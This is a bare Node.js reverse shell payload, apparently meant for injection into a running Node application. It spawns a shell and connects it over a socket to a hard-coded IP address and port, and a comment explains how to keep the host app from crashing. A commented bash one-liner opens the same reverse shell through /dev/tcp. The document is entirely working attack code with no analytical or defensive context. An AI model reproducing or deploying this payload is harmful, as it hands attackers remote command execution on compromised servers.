(function(){
        var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
        var client = new net.Socket();
        client.connect(9001, "10.54.1.194", function(){
                client.pipe(sh.stdin);
                sh.stdout.pipe(client);
                sh.stderr.pipe(client);
        });
        return /a/; // Prevents the Node.js application from crashing
})();
# sh -i >& /dev/tcp/10.54.1.194/9001 0>&1 &
node server.js